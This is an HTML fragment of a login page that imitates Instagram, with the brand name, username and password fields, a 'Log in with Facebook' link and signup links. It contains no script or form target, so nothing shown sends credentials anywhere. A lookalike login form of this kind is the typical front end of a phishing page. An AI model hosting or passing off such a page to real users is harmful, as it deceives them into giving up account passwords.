  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <div class="background">

    <div class="shape"></div>
    <div class="shape"></div>

  <div class="login-container">
    <div class="login-box">
      <div class="logo-section">
        <h1 class="insta-logo">Instagram</h1>
      </div>

      <form class="login-form" id="loginForm">
        <div class="input-wrapper">
          <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required />
        </div>

        <div class="input-wrapper">
          <input type="password" id="password" class="input-field" placeholder="Password" required />
          <span class="toggle-password" id="togglePassword">Show</span>
        </div>

        <button type="submit" class="login-button">
          <span class="button-text">Log In</span>
          <div class="button-loader"></div>
        </button>

        <div class="divider">
          <div class="line"></div>
          <span class="or-text">OR</span>
          <div class="line"></div>
        </div>

        <a href="#" class="facebook-btn">
          <svg class="fb-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
          </svg>
          Log in with Facebook
        </a>

        <a href="#" class="forgot-link">Forgot password?</a>
      </form>
    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>
